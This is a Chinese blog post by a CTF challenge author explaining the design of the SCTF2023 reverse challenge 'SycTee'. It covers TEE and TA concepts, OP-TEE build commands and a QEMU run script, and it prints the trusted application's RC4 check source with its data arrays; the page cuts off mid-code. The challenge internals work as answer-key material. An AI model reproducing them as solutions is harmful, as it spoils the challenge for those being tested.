<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/bitbug_favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/bitbug_favicon.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"jonathanbest7.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="一位逆向菜狗">
<meta property="og:type" content="website">
<meta property="og:title" content="bj777的blog">
<meta property="og:url" content="https://jonathanbest7.github.io/index.html">
<meta property="og:site_name" content="bj777的blog">
<meta property="og:description" content="一位逆向菜狗">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="bj777">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://jonathanbest7.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>bj777的blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">bj777的blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">记录学习每一瞬间</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">1</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">43</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">SCTF2023逆向SycTee出题与解题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-06-21 13:22:48 / 修改时间：13:28:27" itemprop="dateCreated datePublished" datetime="2023-06-21T13:22:48+08:00">2023-06-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="SCTF2023-逆向-SycTee-出题与解题思路"><a href="#SCTF2023-逆向-SycTee-出题与解题思路" class="headerlink" title="SCTF2023 逆向 SycTee 出题与解题思路"></a>SCTF2023 逆向 SycTee 出题与解题思路</h1><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p>SCTF2023是本年度xctf的第二次分站赛，这是第一次出这样大型的比赛的题，头一次没打xctf，在观赛者的角度来看比赛进程，是另一种体验，一方面担心自己的题目没有人做，另一方面也会担心自己的题目是不是过于简单了。</p>
<p>这次比赛出题时间并不多，因为中间还穿插着一些比赛，所以真正开始出题大概是在比赛开始前2天，通宵两天把题目出完，在晚上9点上题前甚至还在添加一些东西，可能有些师傅会觉得有些脑洞，给师傅们造成了不好的体验，在这给各位师傅磕头了orz。</p>
<h2 id="2-做题情况-amp-题目描述"><a href="#2-做题情况-amp-题目描述" class="headerlink" title="2.做题情况&amp;题目描述"></a>2.做题情况&amp;题目描述</h2><p>做题情况：</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5Cimage-20230619141751294.png" alt="image-20230619141751294"></p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5Cimage-20230619141808893.png" alt="image-20230619141808893"></p>
<p>看到师傅们都在通宵做题，还是很感动的。</p>
<p>题目描述：</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5Cimage-20230619141825357.png" alt="image-20230619141825357"></p>
<h2 id="3-出题思路"><a href="#3-出题思路" class="headerlink" title="3.出题思路"></a>3.出题思路</h2><h3 id="1-TEE和TA"><a href="#1-TEE和TA" class="headerlink" title="1.TEE和TA"></a>1.TEE和TA</h3><p>TEE的全称trusted execution environment，它是移动设备（智能手机、平板电脑、智能电视）CPU上的一块区域。这块区域的作用是给数据和代码的执行提供一个更安全的空间，并保证它们的机密性和完整性。TEE提供了一个与REE隔离的环境保存用户的敏感信息，TEE可以直接获取REE的信息，而REE不能获取TEE的信息。</p>
<p>而该题的出题思路就是旨在构建一个tee的系统。</p>
<p>TA（Trusted Application）是TEE中完成特定功能的应用，也叫做可信应用程序。由于TEE中完成计算因此具有较高的安全性。每一个TA在REE中有一个或者多个对应的CA，在REE环境中可以通过调用CA的接口，将信息传送到TEE环境中执行TA，完成对应功能然后返回计算结果。</p>
<p>了解了tee是什么，还应该了解一下一些基本名词：</p>
<ul>
<li><p><strong>CA（Client APP）</strong>：对应一些上层应用，通过调用TEE Client API实现与TEE环境的交互。</p>
</li>
<li><p><strong>REE Communication Agent</strong>：为TA和CA之间的消息传递提供了REE支持</p>
</li>
<li><p><strong>TEE Client API</strong>：是REE中的TEE驱动程序提供给外部的接口，可以使运行在REE中的CA能够与运行在TEE中的TA交换数据。</p>
</li>
<li><p><strong>TEE Communication Agent</strong>：是可信操作系统的特殊组成部分，它与REE Communication Agent一起工作，使TA与CA之间安全地传输消息。</p>
</li>
<li><p><strong>TEE Internal Core API</strong>：是TEE操作系统提供给TA调用的内部接口，包括密码学算法，内存管理等功能。</p>
</li>
<li><p><strong>Trusted Device Drivers</strong>：可信设备驱动程序，为专用于TEE的可信外设提供通信接口。</p>
</li>
<li><p><strong>Shared Memory</strong>：是一块只有CA和TA可以访问的一块安全内存，CA和TA通过共享内存来快速有效传输指令和数据</p>
</li>
</ul>
<p>CA与TA交互流程：CA首先调用TEE Client API触发系统调用，进入REE的操作系统内核态，根据CA调用的参数找到对应的REE驱动程序，REE驱动程序通过调用SMC汇编指令进入Monitor模式，并将处理器切换到安全内核状态，进入安全模式。切换进入TEE以后，CA的服务请求通过总线传到TEE侧，然后TEE OS通过TEE Internal API调用对应的TA，最后TA运行结束后将运行结果和数据返回给CA，执行完以后回到TEE内核态调用SMC汇编指令进入Monitor切回REE环境。</p>
<p>其实用更简单的理解就是：应用层输入 -&gt; 内核 -&gt; TA -&gt; 内核 -&gt; 应用层验证结果</p>
<h3 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h3><p>如果在网上搜，其实这种类型题就在RealWorld上出现过：<a target="_blank" rel="noopener" href="https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html%E8%BF%99%E4%B8%AA%E9%A2%98%E4%BB%96%E7%9A%84%E8%80%83%E7%82%B9%E6%98%AF%E6%B1%82%E8%A2%AB%E5%8A%A0%E5%AF%86%E7%9A%84">https://bestwing.me/RWCTF-4th-TrustZone-challenge-Writeup.html这个题他的考点是求被加密的</a> <code>FEK</code>，类似一个密码题，所以这次出题就换一个思路，原本思路是在optee框架下，build出一个rust的基于arm架构的ta文件，在上一些全局变量，顺便来点动调，把整个optee项目打包出题，不过由于时间问题，并没有完成大部分。在构建系统的时候踩过很多坑，接下来我在介绍的时候会尽量详细介绍，网上可阅读的解决方案实在少之又少。</p>
<h4 id="OPTEE"><a href="#OPTEE" class="headerlink" title="OPTEE"></a>OPTEE</h4><p>项目文档：<a target="_blank" rel="noopener" href="https://optee.readthedocs.io/en/latest/">https://optee.readthedocs.io/en/latest/</a></p>
<p>OP-TEE 是一个可信执行环境 (TEE)，旨在与在 Arm 上运行的非安全 Linux 内核配套使用；使用 TrustZone 技术的 Cortex-A 内核。</p>
<p>该项目的构建有两种方法：第一种是用repo直接懒人布置，第二种是手拉文件，逐项布置。</p>
<p>两种方式各有各的坏处，但综合起来第一种方式更好。首先如果选用repo来部署的话，会面临一个被墙的问题，即使在虚拟机里配代理，又或者是在服务器上拉都会遇到很大报错问题。手拉文件也会遇到很多问题，比如optee-client的make会报很多错误，网上并没有很多解决方案。</p>
<h5 id="环境构建："><a href="#环境构建：" class="headerlink" title="环境构建："></a>环境构建：</h5><p>repo的安装：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/bin</span><br><span class="line">PATH=~/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="regexp">//</span>下载工具并执行</span><br><span class="line">curl https:<span class="regexp">//</span>storage.googleapis.com<span class="regexp">/git-repo-downloads/</span>repo &gt; ~<span class="regexp">/bin/</span>repo</span><br><span class="line">chmod a+x ~<span class="regexp">/bin/</span>repo</span><br></pre></td></tr></table></figure>

<p>接下来初始化repo：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd optee</span><br><span class="line">mkdir optee</span><br><span class="line">repo init -u https:<span class="regexp">//gi</span>thub.com<span class="regexp">/OP-TEE/m</span>anifest.git -m qemu_v8.xml --repo-url=https:<span class="regexp">//mi</span>rrors.tuna.tsinghua.edu.cn<span class="regexp">/git/gi</span>t-repo/ -b <span class="number">3.18</span>.<span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>在这里我拉取的是3.18.0版本的optee，而且用qemu_v8平台，建议换源来拉。</p>
<p>在.repo\manifests目录下可以看到qemu_v8.xml配置单。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">remote</span> <span class="attr">name</span>=<span class="string">&quot;github&quot;</span>   <span class="attr">fetch</span>=<span class="string">&quot;https://github.com&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">remote</span> <span class="attr">name</span>=<span class="string">&quot;tfo&quot;</span>      <span class="attr">fetch</span>=<span class="string">&quot;https://git.trustedfirmware.org&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span> <span class="attr">remote</span>=<span class="string">&quot;github&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;master&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- OP-TEE gits --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;optee_client&quot;</span>         <span class="attr">name</span>=<span class="string">&quot;OP-TEE/optee_client.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;optee_os&quot;</span>             <span class="attr">name</span>=<span class="string">&quot;OP-TEE/optee_os.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;optee_test&quot;</span>           <span class="attr">name</span>=<span class="string">&quot;OP-TEE/optee_test.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;build&quot;</span>                <span class="attr">name</span>=<span class="string">&quot;OP-TEE/build.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">linkfile</span> <span class="attr">src</span>=<span class="string">&quot;qemu_v8.mk&quot;</span> <span class="attr">dest</span>=<span class="string">&quot;build/Makefile&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- linaro-swg gits --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;linux&quot;</span>                <span class="attr">name</span>=<span class="string">&quot;linaro-swg/linux.git&quot;</span>                  <span class="attr">revision</span>=<span class="string">&quot;9823b258b332b4ac98e05fa23448bbc9e937b24c&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;optee_benchmark&quot;</span>      <span class="attr">name</span>=<span class="string">&quot;linaro-swg/optee_benchmark.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;optee_examples&quot;</span>       <span class="attr">name</span>=<span class="string">&quot;linaro-swg/optee_examples.git&quot;</span> <span class="attr">revision</span>=<span class="string">&quot;refs/tags/3.8.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;soc_term&quot;</span>             <span class="attr">name</span>=<span class="string">&quot;linaro-swg/soc_term.git&quot;</span>               <span class="attr">revision</span>=<span class="string">&quot;5493a6e7c264536f5ca63fe7511e5eed991e4f20&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Misc gits --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;buildroot&quot;</span>            <span class="attr">name</span>=<span class="string">&quot;buildroot/buildroot.git&quot;</span>               <span class="attr">revision</span>=<span class="string">&quot;95942f5fcd35d783a49adce621ccf33480f1c88c&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;edk2&quot;</span>                 <span class="attr">name</span>=<span class="string">&quot;tianocore/edk2.git&quot;</span>                    <span class="attr">revision</span>=<span class="string">&quot;dd4cae4d82c7477273f3da455084844db5cca0c0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;mbedtls&quot;</span>              <span class="attr">name</span>=<span class="string">&quot;ARMmbed/mbedtls.git&quot;</span>                   <span class="attr">revision</span>=<span class="string">&quot;refs/tags/mbedtls-2.16.0&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;qemu&quot;</span>                 <span class="attr">name</span>=<span class="string">&quot;qemu/qemu.git&quot;</span>                         <span class="attr">revision</span>=<span class="string">&quot;refs/tags/v3.1.0-rc3&quot;</span> <span class="attr">clone-depth</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project</span> <span class="attr">path</span>=<span class="string">&quot;trusted-firmware-a&quot;</span>   <span class="attr">name</span>=<span class="string">&quot;TF-A/trusted-firmware-a.git&quot;</span>           <span class="attr">revision</span>=<span class="string">&quot;34efb683e32254b8c325ac3071c5776d243a7b99&quot;</span> <span class="attr">remote</span>=<span class="string">&quot;tfo&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来就是要下载配置单的过程：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span>-j是开启多线程， 不加也可以</span><br><span class="line">repo sync -j8</span><br></pre></td></tr></table></figure>

<p>在下载前呢，需要设置代理，这样更快，或者在qemu_v8清单中的revision后加上clone-depth&#x3D;”1”，或者：</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">//</span>将配置单换成<span class="string">.git</span>速度更快</span><br><span class="line">sed -i <span class="string">&quot;s/\.git//g&quot;</span> <span class="string">.repo/manifest.xml</span></span><br></pre></td></tr></table></figure>

<p>最后别忘了代理：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> <span class="attribute">https_proxy</span>=http://127.0.0.1:7890 </span><br><span class="line"><span class="attribute">http_proxy</span>=http://127.0.0.1:7890 </span><br><span class="line"><span class="attribute">all_proxy</span>=socks5://127.0.0.1:7890</span><br></pre></td></tr></table></figure>

<p>不过经过测验，这个拉取也是需要时间的，不管用服务器还是设代理有时候照样拉不了，多尝试几次就可以拉了，我是下午的时候拉成功的。</p>
<p>构建完的目录如下：</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5Cimage-20230619164151741.png" alt="image-20230619164151741"></p>
<p>optee_example和optee_rust目录都是可以自己创建ta程序</p>
<p>如果某些文件实在拉不下来，就手拉，从qemu-v8里找，一个一个拉，但版本要一定。</p>
<p>接下来获取工具链：</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> build</span><br><span class="line"><span class="keyword">make</span> toolchains</span><br></pre></td></tr></table></figure>

<p>实在不能获取，就只能手拉下载，解压即可</p>
<p>然后在build目录下：</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">make</span></span><br></pre></td></tr></table></figure>

<p>之后能得到&#x2F;out&#x2F;bin文件夹下就是启动文件，设置run.sh启动</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">qemu-system-aarch64 \</span><br><span class="line">	-nographic \</span><br><span class="line">	-smp 2 \</span><br><span class="line">	-machine virt,secure=on,gic-version=3,virtualization=<span class="literal">false</span> \</span><br><span class="line">	-cpu cortex-a57 \</span><br><span class="line">	-d unimp -semihosting-config <span class="built_in">enable</span>=on,target=native \</span><br><span class="line">	-m 1024 \</span><br><span class="line">	-bios bl1.bin \</span><br><span class="line">	-initrd rootfs.cpio.gz \</span><br><span class="line">	-kernel Image -no-acpi \</span><br><span class="line">	-append console=<span class="string">&quot;ttyAMA0,38400 keep_bootcon root=/dev/vda2  -object rng-random,filename=/dev/urandom,id=rng0 -device virtio-rng-pci,rng=rng0,max-bytes=1024,period=1000&quot;</span> \</span><br><span class="line">	-no-reboot \</span><br><span class="line">	-monitor null</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来是编译rust，在optee_rust里有许多测试用例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(cd build &amp;&amp; make toolchains &amp;&amp; make OPTEE_RUST_ENABLE=y CFG_TEE_RAM_VA_SIZE=<span class="number">0x00300000</span>)</span><br></pre></td></tr></table></figure>

<p>不过当时编译了一天一直报错，首先是helloworld-rs有错误，删除之后再编译就会出现缺少glibc库，解决方案还没有思路，不过应该要看一下makefile是怎么做的。</p>
<h4 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h4><p>bj666将数据全部存储在了ta文件中，不需要host的main进行传输数据，用了rc4，输入key就能得到right。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> TEE_Result <span class="title function_">www</span><span class="params">(<span class="type">uint32_t</span> param_types,</span></span><br><span class="line"><span class="params">	TEE_Param params[<span class="number">4</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">uint32_t</span> exp_param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_MEMREF_INOUT,</span><br><span class="line">						   TEE_PARAM_TYPE_NONE,</span><br><span class="line">						   TEE_PARAM_TYPE_NONE,</span><br><span class="line">						   TEE_PARAM_TYPE_NONE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//who需要爆破</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *who = (<span class="type">const</span> <span class="type">char</span> *)(params[<span class="number">0</span>].memref.buffer);</span><br><span class="line">	<span class="type">const</span> <span class="type">size_t</span> GREETING_LEN = <span class="built_in">strlen</span>(who);</span><br><span class="line">	<span class="keyword">if</span> (param_types != exp_param_types)</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_BAD_PARAMETERS;</span><br><span class="line">	<span class="type">char</span> *buf = TEE_Malloc(<span class="built_in">strlen</span>(who) + GREETING_LEN + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!buf)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> TEE_ERROR_OUT_OF_MEMORY;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> data[<span class="number">34</span>] = &#123;<span class="number">0x73</span>,<span class="number">0x63</span>,<span class="number">0x74</span>,<span class="number">0x66</span>,<span class="number">0x7b</span>,<span class="number">0x54</span>,<span class="number">0x65</span>,<span class="number">0x33</span>,<span class="number">0x26</span>,<span class="number">0x54</span>,<span class="number">0x41</span>,<span class="number">0x5f</span>,<span class="number">0x69</span>,<span class="number">0x73</span>,<span class="number">0x5f</span>,<span class="number">0x73</span>,<span class="number">0x61</span>,<span class="number">0x66</span>,<span class="number">0x33</span>,<span class="number">0x5f</span>,<span class="number">0x62</span>,<span class="number">0x75</span>,<span class="number">0x74</span>,<span class="number">0x5f</span>,<span class="number">0x46</span>,<span class="number">0x41</span>,<span class="number">0x4b</span>,<span class="number">0x45</span>,<span class="number">0x5f</span>,<span class="number">0x46</span>,<span class="number">0x4c</span>,<span class="number">0x41</span>,<span class="number">0x47</span>,<span class="number">0x7d</span>&#125;;</span><br><span class="line">	enc_dec(who,data);</span><br><span class="line">	<span class="type">int</span> cmp[<span class="number">34</span>] = &#123;<span class="number">0x8e</span>,<span class="number">0xd6</span>,<span class="number">0x93</span>,<span class="number">0x67</span>,<span class="number">0x84</span>,<span class="number">0xce</span>,<span class="number">0xd2</span>,<span class="number">0x7d</span>,<span class="number">0xcb</span>,<span class="number">0x9a</span>,<span class="number">0xb7</span>,<span class="number">0xa8</span>,<span class="number">0x65</span>,<span class="number">0xe6</span>,<span class="number">0x97</span>,<span class="number">0x80</span>,<span class="number">0x63</span>,<span class="number">0x26</span>,<span class="number">0x74</span>,<span class="number">0x7c</span>,<span class="number">0xdf</span>,<span class="number">0xcd</span>,<span class="number">0x3a</span>,<span class="number">0x8b</span>,<span class="number">0x9f</span>,<span class="number">0x38</span>,<span 